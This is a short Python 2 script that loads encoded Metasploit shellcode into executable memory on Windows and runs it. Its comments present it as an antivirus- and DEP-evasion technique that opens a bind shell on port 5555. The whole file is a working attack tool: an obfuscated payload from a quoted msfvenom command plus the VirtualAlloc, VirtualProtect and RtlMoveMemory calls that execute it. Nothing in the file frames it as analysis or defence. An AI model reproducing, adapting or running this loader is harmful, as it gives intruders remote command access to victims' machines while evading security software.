#!/usr/bin/env python2
from ctypes import *
import ctypes

# For when DEP is in play
# Based heavily on https://github.com/ciccio-87/Python-AV-Evasion/blob/master/winshell.py
# This works on my test box (Win 7 x86 SP1)
# Nice clean bindshell on 5555 :) <3<3<3

PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4

sc = ("\xdd\xc5\x89\xe3\xd9\x73\xf4\x59\x6a\x45\x03\x0c\x24\x5b\x51"
"\x5f\x8d\x7f\x02\x31\xd2\x66\xba\x15\xff\x66\xf7\xd2\xff\x37"
"\x58\xc1\xe0\x10\xc1\xe8\x10\x83\xc7\x02\xff\x31\x5e\xc1\xe6"
"\x10\xc1\xee\x10\x31\xc6\x66\x89\x31\x6a\x02\x03\x0c\x24\x5b"
"\x4a\x85\xd2\x0f\x85\xd7\xff\xff\xff\x92\x65\x48\xb2\x91\xc6"
"\xb5\x32\xef\xb3\x05\x0f\xfa\xf0\x05\xa2\x5b\xc8\x59\xcb\x6d"
"\xef\x36\x87\x0e\x78\xf1\x87\xae\x70\x79\xfb\x77\x3a\x96\x2a"
"\x57\xc3\x47\x4e\x31\x4c\xce\x7e\x96\xbf\x76\xaf\xb7\x47\xa7"
"\x76\x6f\x10\x3f\x76\xb0\x74\x33\xb6\x31\xf9\xb4\x06\xbb\x83"
"\x62\x7c\x9d\x83\xa4\xd8\x46\x56\x2d\x38\x9f\x26\xd9\x67\x1c"
"\xe1\x9d\x30\x47\x60\x76\xce\xb8\x9f\x89\xff\x71\xf9\x30\xa4"
"\x8e\x9f\xc7\x75\x71\xac\x9d\xb4\x93\xbc\x5c\x5e\x83\x31\x07"
"\x5c\x08\x06\xc6\xba\x18\xc7\x28\xaa\x29\x11\x4e\x23\x1e\x90"
"\xa1\xdd\xe1\x6f\x5e\x94\x64\xa6\x51\x11\xbc\x59\xae\xee\x52"
"\x5a\xbc\x05\xc2\xb1\x2c\xee\x32\xd3\x39\xbd\xe7\xe4\x67\xda"
"\x89\x08\x5b\x3a\x3e\xba\xf8\x03\xef\xab\x26\xa5\x7b\x2b\x83"
"\xda\x72\x68\xeb\xe5\x18\x7b\xa1\x37\x9d\xa4\x25\x2f\xfb\x4e"
"\x11\x92\x44\xa1\xbe\xf6\xa1\xf9\xd0\xe2\xde\x95\x4c\xc6\x43"
"\x60\x80\xb8\xd6\x3e\x14\x35\xc9\xfa\x13\x12\xf4\x94\xa5\x48"
"\xc9\xcf\x4e\x22\xdd\x09\x9b\x2b\x05\x01\x84\x1b\xfa\x44\x8d"
"\x5d\x8e\xfa\xc2\x9e\xe5\x4c\x4d\x70\xe1\xfa\x6d\xc7\x12\x2b"
"\x15\x1a\x21\x7d\x7e\x50\x4b\xe4\x9f\xcd\x21\x78\x25\xd8\xdf"
"\x49\xff\xb2\x5e\x42\x27\xe3\xd7\xec\x4e\x12\xe1\x47\xf3\xab"
"\xb7\x73\xf8\xf7\x8f\x1d\xc0\x99\xdf\x04\xe3\xb2\xa3\x7b\xf7"
"\x81\xc0\x6e\x93\x6b\x71\x3c\xb2\x38\x50\x6f\xba\xaf\x0c\xa8"
"\x8e\x41\xb8\x2d\x3a\x3b\xd9\x3d\x53\x72\xe0\x96\x97\x99\x74"
"\x3d\x53\x5a\x5a\xf1\xa2\x76\x54\x08\x3b\xe7\xcf\x99\xb5\xc5"
"\xc8\x5d\xd8\x11\xf3\xde\x8b\x50\x7b\xa8\x64\xd9\x41\x76\x36"
"\xb0\xfa\x27\x72\x1e\x6b\xde\x8b\x93\x7e\x68\x7f\xda\x5f\x76"
"\xc9\xac\x9c\x6e\x47\xd5\xed\xc2\x5e\x1a\x99\x69\x2a\x38\x0e"
"\x1c\xea\x1a\xff\xc8\x71\xdc\x3d\x58\x51\xb1\x7b\xf2\x53\x3f"
"\x45\x7d\x6c\x3d\x3e\x5b\x07\xdd\x55\xff\x38\x29\x3c\x5d\x07"
"\xcd\x55\xf7\x38\x31\x39\x5d\x3c\xe2\xf1\xb1\x72\xf1\x6a\x2b"
"\x09\x25\x47\xb9\xdb\x87\xfd\x13\xe6\x30\xa0\x5b\x6e\xc3\xd8"
"\x1d\xb4\xd3\x6a\xab\x93\xd8\xd0\x5f\xfc\x10\xb9\xeb\x9f\x24"
"\x21\x3f\x72\xf5\x77\xa9\x37\x11\x5d\x27\x1d\xcc\x88\x2f") # len 539
# msfvenom -p windows/shell_bind_tcp LPORT=5555 -b '\x00\x0a\x0d' -e x86/bloxor -i 3 -f c 


def executable_code(buffer):
    buf = c_char_p(buffer)
    size = len(buffer)
    # Need to align to a page boundary, so use valloc
    addr = libc.valloc(size)
    addr = c_void_p(addr)
    if 0 == addr:  
        raise Exception("Failed to allocate memory")
    memmove(addr, buf, size)
    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
        raise Exception("Failed to set protection on buffer")
    return addr


VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
VirtualProtect = ctypes.windll.kernel32.VirtualProtect
shellcode = bytearray(sc)
memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
old = ctypes.c_long(1)
VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),
                                            0x40,
                                            ctypes.byref(old))

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell), 
                                    buf, 
                                    ctypes.c_int(len(shellcode)))

shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()


